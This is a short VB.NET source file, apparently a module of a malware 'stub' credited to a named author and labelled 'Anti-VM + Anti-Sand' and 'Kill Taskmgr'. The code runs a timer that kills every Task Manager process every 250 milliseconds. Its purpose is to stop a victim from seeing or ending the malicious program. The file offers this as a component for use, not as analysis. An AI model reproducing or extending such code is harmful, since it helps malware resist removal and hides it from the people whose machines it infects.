Imports System
Imports System.Diagnostics
Imports System.Timers
Imports Microsoft.VisualBasic.CompilerServices

Namespace Stub
    Public Class NoTsk

        '########################
        '#  Anti-VM + Anti-Sand #
        '#  Humoud Al-Juraid    #
        '#      @HumoudMJ       #
        '# Please Donot remove  #
        '#	    my credit       #
        '########################

        'Kill Taskmgr Mod 4 Platinum

        Public Shared Sub Handler(ByVal sender As Object, ByVal e As ElapsedEventArgs)

            Dim process As Process
            For Each process In Process.GetProcessesByName("taskmgr")
                Try
                    process.Kill()
                Catch ex As Exception
                End Try
            Next




        End Sub

        Public Shared Sub Start()
            NoTsk.Timer = New Timer(250)
            AddHandler NoTsk.Timer.Elapsed, New ElapsedEventHandler(AddressOf NoTsk.Handler)
            NoTsk.Timer.Enabled = True
        End Sub


        ' Fields
        Private Shared Timer As Timer
        '' Private Shared xN As j.OK = New j.OK
    End Class
End Namespace

